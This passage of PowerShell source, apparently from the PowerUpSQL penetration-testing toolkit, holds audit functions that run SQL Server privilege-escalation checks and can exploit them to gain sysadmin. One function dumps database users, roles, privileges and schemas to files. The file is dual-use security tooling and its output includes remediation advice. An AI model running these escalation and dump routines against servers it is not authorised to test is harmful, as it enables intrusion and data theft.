                # we don't use 'Get-Variable -Exclude', because it uses regexps.
                # One of the veriables that we pass is '$?'.
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where-Object -FilterScript {
                        -not ($VariablesToExclude -contains $_.Name)
                } )
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"
            }

            if ($ImportModules)
            {
                $UserModules = @( Get-Module |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin |
                    Select-Object -ExpandProperty Name |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Snapins -notcontains $_
                } )
            }
        }

        #region functions

        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$Wait )

            #loop through runspaces
            #if $wait is specified, keep looping until all complete
            Do
            {
                #set more to false for tracking completion
                $more = $false

                #Progress bar if we have inputobject count (bound parameter)
                if (-not $Quiet)
                {
                    Write-Progress  -Activity 'Running Query' -Status 'Starting threads'`
                    -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                    -PercentComplete $( Try
                        {
                            $script:completedCount / $totalCount * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }

                #run through each runspace.
                Foreach($runspace in $runspaces)
                {
                    #get the duration - inaccurate
                    $currentdate = Get-Date
                    $runtime = $currentdate - $runspace.startTime
                    $runMin = [math]::Round( $runtime.totalminutes ,2 )

                    #set up log object
                    $log = '' | Select-Object -Property Date, Action, Runtime, Status, Details
                    $log.Action = "Removing:'$($runspace.object)'"
                    $log.Date = $currentdate
                    $log.Runtime = "$runMin minutes"

                    #If runspace completed, end invoke, dispose, recycle, counter++
                    If ($runspace.Runspace.isCompleted)
                    {
                        $script:completedCount++

                        #check if there were errors
                        if($runspace.powershell.Streams.Error.Count -gt 0)
                        {
                            #set the logging info and move the file to completed
                            $log.status = 'CompletedWithErrors'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            foreach($ErrorRecord in $runspace.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord $ErrorRecord
                            }
                        }
                        else
                        {
                            #add logging details and cleanup
                            $log.status = 'Completed'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        }

                        #everything is logged, clean up the runspace
                        $runspace.powershell.EndInvoke($runspace.Runspace)
                        $runspace.powershell.dispose()
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                    }

                    #If runtime exceeds max, dispose the runspace
                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout)
                    {
                        $script:completedCount++
                        $timedOutTasks = $true

                        #add logging details and cleanup
                        $log.status = 'TimedOut'
                        #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        Write-Error -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String)"

                        #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                        if (!$NoCloseOnTimeout)
                        {
                            $runspace.powershell.dispose()
                        }
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                        $completedCount++
                    }

                    #If runspace isn't null set more to true
                    ElseIf ($runspace.Runspace -ne $null )
                    {
                        $log = $null
                        $more = $true
                    }

                    #log the results if a log file was indicated
                    <#
                            if($logFile -and $log){
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                            }
                    #>
                }

                #Clean out unused runspace jobs
                $temphash = $runspaces.clone()
                $temphash |
                Where-Object -FilterScript {
                    $_.runspace -eq $null
                } |
                ForEach-Object -Process {
                    $runspaces.remove($_)
                }

                #sleep for a bit if we will loop again
                if($PSBoundParameters['Wait'])
                {
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #Loop again only if -wait parameter and there are more runspaces to process
            }
            while ($more -and $PSBoundParameters['Wait'])

            #End of runspace function
        }

        #endregion functions

        #region Init

        if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
        {
            $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | Out-String) )
        }
        elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
        {
            #Start building parameter names for the param block
            [string[]]$ParamsToAdd = '$_'
            if( $PSBoundParameters.ContainsKey('Parameter') )
            {
                $ParamsToAdd += '$Parameter'
            }

            $UsingVariableData = $null


            # This code enables $Using support through the AST.
            # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!

            if($PSVersionTable.PSVersion.Major -gt 2)
            {
                #Extract using references
                $UsingVariables = $ScriptBlock.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)

                If ($UsingVariables)
                {
                    $List = New-Object -TypeName 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                    ForEach ($Ast in $UsingVariables)
                    {
                        [void]$List.Add($Ast.SubExpression)
                    }

                    $UsingVar = $UsingVariables |
                    Group-Object -Property SubExpression |
                    ForEach-Object -Process {
                        $_.Group |
                        Select-Object -First 1
                    }

                    #Extract the name, value, and create replacements for each
                    $UsingVariableData = ForEach ($Var in $UsingVar)
                    {
                        Try
                        {
                            $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = $Var.SubExpression.Extent.Text
                                Value      = $Value.Value
                                NewName    = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                    $NewParams = $UsingVariableData.NewName -join ', '
                    $Tuple = [Tuple]::Create($List, $NewParams)
                    $bindingFlags = [Reflection.BindingFlags]'Default,NonPublic,Instance'
                    $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                    $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                    $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                    #Write-Verbose $StringScriptBlock
                }
            }

            $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ', '))`r`n" + $ScriptBlock.ToString())
        }
        else
        {
            Throw 'Must provide ScriptBlock or ScriptFile'
            Break
        }

        Write-Debug -Message "`$ScriptBlock: $($ScriptBlock | Out-String)"
        Write-Verbose -Message 'Creating runspace pool and session states'


        #If specified, add variables and modules/snapins to session state
        $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($ImportVariables)
        {
            if($UserVariables.count -gt 0)
            {
                foreach($Variable in $UserVariables)
                {
                    $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
        }
        if ($ImportModules)
        {
            if($UserModules.count -gt 0)
            {
                foreach($ModulePath in $UserModules)
                {
                    $sessionstate.ImportPSModule($ModulePath)
                }
            }
            if($UserSnapins.count -gt 0)
            {
                foreach($PSSnapin in $UserSnapins)
                {
                    [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                }
            }
        }

        # --------------------------------------------------
        #region - Import Session Functions
        # --------------------------------------------------
        # Import functions from the current session into the RunspacePool sessionstate

        if($ImportSessionFunctions)
        {
            # Import all session functions into the runspace session state from the current one
            Get-ChildItem -Path Function:\ |
            Where-Object -FilterScript {
                $_.name -notlike '*:*'
            } |
            Select-Object -Property name -ExpandProperty name |
            ForEach-Object -Process {
                # Get the function code
                $Definition = Get-Content -Path "function:\$_" -ErrorAction Stop

                # Create a sessionstate function with the same name and code
                $SessionStateFunction = New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $Definition

                # Add the function to the session state
                $sessionstate.Commands.Add($SessionStateFunction)
            }
        }
        #endregion

        #Create runspace pool
        $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
        $runspacepool.Open()

        #Write-Verbose "Creating empty collection to hold runspace jobs"
        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList

        #If inputObject is bound get a total count and set bound to true
        $bound = $PSBoundParameters.keys -contains 'InputObject'
        if(-not $bound)
        {
            [System.Collections.ArrayList]$allObjects = @()
        }

        <#
                #Set up log file if specified
                if( $LogFile ){
                New-Item -ItemType file -path $logFile -force | Out-Null
                ("" | Select Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
                }

                #write initial log entry
                $log = "" | Select Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
        #>
        $timedOutTasks = $false

        #endregion INIT
    }

    Process {

        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound)
        {
            $allObjects = $InputObject
        }
        Else
        {
            [void]$allObjects.add( $InputObject )
        }
    }

    End {

        #Use Try/Finally to catch Ctrl+C and clean up.
        Try
        {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0

            foreach($object in $allObjects)
            {
                #region add scripts to runspace pool

                #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                $powershell = [powershell]::Create()

                if ($VerbosePreference -eq 'Continue')
                {
                    [void]$powershell.AddScript({
                            $VerbosePreference = 'Continue'
                    })
                }

                [void]$powershell.AddScript($ScriptBlock).AddArgument($object)

                if ($Parameter)
                {
                    [void]$powershell.AddArgument($Parameter)
                }

                # $Using support from Boe Prox
                if ($UsingVariableData)
                {
                    Foreach($UsingVariable in $UsingVariableData)
                    {
                        #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                        [void]$powershell.AddArgument($UsingVariable.Value)
                    }
                }

                #Add the runspace into the powershell instance
                $powershell.RunspacePool = $runspacepool

                #Create a temporary collection for each runspace
                $temp = '' | Select-Object -Property PowerShell, StartTime, object, Runspace
                $temp.PowerShell = $powershell
                $temp.StartTime = Get-Date
                $temp.object = $object

                #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                $temp.Runspace = $powershell.BeginInvoke()
                $startedCount++

                #Add the temp tracking info to $runspaces collection
                #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                $null = $runspaces.Add($temp)

                #loop through existing runspaces one time
                Get-RunspaceData

                #If we have more running than max queue (used to control timeout accuracy)
                #Script scope resolves odd PowerShell 2 issue
                $firstRun = $true
                while ($runspaces.count -ge $script:MaxQueue)
                {
                    #give verbose output
                    if($firstRun)
                    {
                        #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                    }
                    $firstRun = $false

                    #run get-runspace data and sleep for a short while
                    Get-RunspaceData
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #endregion add scripts to runspace pool
            }

            #Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
            Get-RunspaceData -wait

            if (-not $Quiet)
            {
                Write-Progress -Activity 'Running Query' -Status 'Starting threads' -Completed
            }
        }
        Finally
        {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
            {
                Write-Verbose -Message 'Closing the runspace pool'
                $runspacepool.close()
            }

            #collect garbage
            [gc]::Collect()
        }
    }
}



#endregion

#########################################################################
#
#region                 Primary FUNCTIONs
#          Invoke-SQLDump, Invoke-SQLAudit, Invoke-SQLEscalatePriv
#
#########################################################################

# ----------------------------------
# Invoke-SQLAudit
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAudit
{
    <#
            .SYNOPSIS
            Audit for high impact weak configurations by running all privilege escalation checks.
            Note:  Use the Exploit flag to attempt to obtain sysadmin privileges.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoOutput
            Don't output anything.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .PARAMETER OutFolder
            Folder to write results to csv.
            .EXAMPLE
            PS C:\> Invoke-SQLAudit -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123!

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : PERMISSION - IMPERSONATE LOGIN
            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : No
            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
            Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016

            [TRUNCATED]
            .EXAMPLE
            PS C:\> Invoke-SQLAudit -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123! -Exploit
            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : PERMISSION - IMPERSONATE LOGIN
            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : Yes
            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
            Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Invoke-SQLAudit -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123! -OutFolder c:\temp

            [TRUNCATED]
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write results to csv.')]
        [string]$OutFolder
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')

        # Table for escalation functions
        $TblVulnFunc = New-Object -TypeName System.Data.DataTable
        $null = $TblVulnFunc.Columns.Add('FunctionName')
        $null = $TblVulnFunc.Columns.Add('Type')
        $TblVulnFunc.Clear()

        Write-Verbose -Message 'LOADING VULNERABILITY CHECKS.'

        # Load list of vulnerability check functions - Server / database
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditDefaultLoginPw ','Server')   
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditWeakLoginPw','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivImpersonateLogin','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivServerLink','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivTrustworthy','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivDbChaining','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivCreateProcedure','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpDirtree','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpFileexist','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbDdlAdmin','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbOwner','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSampleDataByColumn','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSQLiSpExecuteAs','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSQLiSpSigned','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivAutoExecSp','Database') 
         
        Write-Verbose -Message 'RUNNING VULNERABILITY CHECKS.'
    }

    Process
    {
        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            Return
        }

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose -Message "$Instance : RUNNING VULNERABILITY CHECKS..."

        # Iterate through each function
        $TblVulnFunc |
        ForEach-Object -Process {
            # Get function name
            $FunctionName = $_.FunctionName

            # Run function
            if($Exploit)
            {
                $TblTemp = Invoke-Expression -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password' -Exploit"
            }
            else
            {
                $TblTemp = Invoke-Expression -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password'"
            }

            # Append function output to results table
            $TblData = $TblData + $TblTemp
        }

        # Status user
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK."
    }

    End
    {
        # Status user
        Write-Verbose -Message 'COMPLETED ALL VULNERABILITY CHECKS.'

        # Setup output directory and write results
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
            $CheckAccess = (Invoke-Expression -Command $OutFolderCmd) 2>&1
            if($CheckAccess -like '*denied.')
            {
                Write-Verbose -Object 'Access denied to output directory.'
                Return
            }
            else
            {
                Write-Verbose -Message 'Verified write access to output directory.'
                $RemoveCmd = "del $OutFolder\test.txt"
                Invoke-Expression -Command $RemoveCmd
                $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
                $OutPutPath = "$OutFolder\"+'PowerUpSQL_Audit_Results_'+$OutPutInstance+'.csv'
                $OutPutInstance
                $OutPutPath
                $TblData  | Export-Csv -NoTypeInformation $OutPutPath
            }
        }

        # Return full results table
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ----------------------------------
# Invoke-SQLEscalatePriv
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLEscalatePriv
{
    <#
            .SYNOPSIS
            This function can be used to attempt to obtain sysadmin privileges via identify vulnerabilities.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Invoke-SQLEscalatePriv -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )

    Begin
    {
    }

    Process
    {
        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            Return
        }

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Check for sysadmin
        Write-Verbose -Message "$Instance : Checking if you're already a sysadmin..."
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
        if($IsSysadmin -eq 'Yes')
        {
            Write-Verbose -Message "$Instance : You are, so nothing to do here. :)"
        }
        else
        {
            Write-Verbose -Message "$Instance : You're not a sysadmin, attempting to change that..."
            Invoke-SQLAudit -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoOutput -Exploit

            # Check for sysadmin again
            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
            if($IsSysadmin2 -eq 'Yes')
            {
                Write-Verbose -Message "$Instance : Success! You are now a sysadmin!"
            }
            else
            {
                Write-Verbose -Message "$Instance : Fail. We couldn't get you sysadmin access today."
            }
        }
    }

    End
    {
    }
}

# ----------------------------------
# Invoke-SQLDumpInfo
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLDumpInfo
{
    <#
            .SYNOPSIS
            This function can be used to attempt to obtain sysadmin privileges via identify vulnerabilities.  It supports both csv and xml output.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER XML
            Generate xml output instead of csv.
            .PARAMETER OutFolder
            Output to a specific path instead of the current directory.
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLDumpInfo -Verbose
            .EXAMPLE
            PS C:\> Invoke-SQLDumpInfo -Verobse -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write output to.')]
        [string]$OutFolder,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to xml files.')]
        [switch]$xml,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to csv files.')]
        [switch]$csv
    )

    Begin
    {
        # Setup output directory
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }
        else
        {
            $OutFolder = '.'
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }

        # Create output folder
        $CheckAccess = (Invoke-Expression -Command $OutFolderCmd) 2>&1
        if($CheckAccess -like '*denied.')
        {
            Write-Host -Object 'Access denied to output directory.'
            Return
        }
        else
        {
            Write-Verbose -Message 'Verified write access to output directory.'
            $RemoveCmd = "del $OutFolder\test.txt"
            Invoke-Expression -Command $RemoveCmd
        }
    }

    Process
    {
        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            Return
        }

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        Write-Verbose -Message "$Instance - START..."
        $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')

        # Getting Databases
        Write-Verbose -Message "$Instance - Getting non-default databases..."
        $Results = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseUsers
        Write-Verbose -Message "$Instance - Getting database users for databases..."
        $Results = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabasePrivs
        Write-Verbose -Message "$Instance - Getting privileges for databases..."
        $Results = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseRoles
        Write-Verbose -Message "$Instance - Getting database roles..."
        $Results = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseRoleMembers
        Write-Verbose -Message "$Instance - Getting database role members..."
        $Results = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseTables
        Write-Verbose -Message "$Instance - Getting database schemas..."
        $Results = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseTables
        Write-Verbose -Message "$Instance - Getting database tables..."
        $Results = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseViews
        Write-Verbose -Message "$Instance - Getting database views..."
        $Results = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Database Tables
        Write-Verbose -Message "$Instance - Getting database columns..."
        $Results = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
